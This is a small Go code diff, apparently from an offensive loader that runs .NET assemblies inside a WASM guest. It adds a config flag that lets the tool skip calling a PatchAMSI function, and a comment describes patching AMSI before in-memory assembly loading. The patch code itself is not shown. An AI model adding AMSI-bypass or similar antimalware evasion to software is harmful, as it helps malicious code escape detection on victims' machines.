@@ -72,7 +72,7 @@ func Run(ctx context.Context, cfg *Config) error {
 
 	// Patch AMSI before WASM execution. Must happen after LoadLibraryA/amsi.dll
 	// is available but before any CLR Assembly.Load(byte[]) in the WASM guest.
-	if cfg.Win32APIs {
+	if cfg.Win32APIs && !cfg.NoAMSIPatch {
 		hostmod.PatchAMSI()
 	}
 
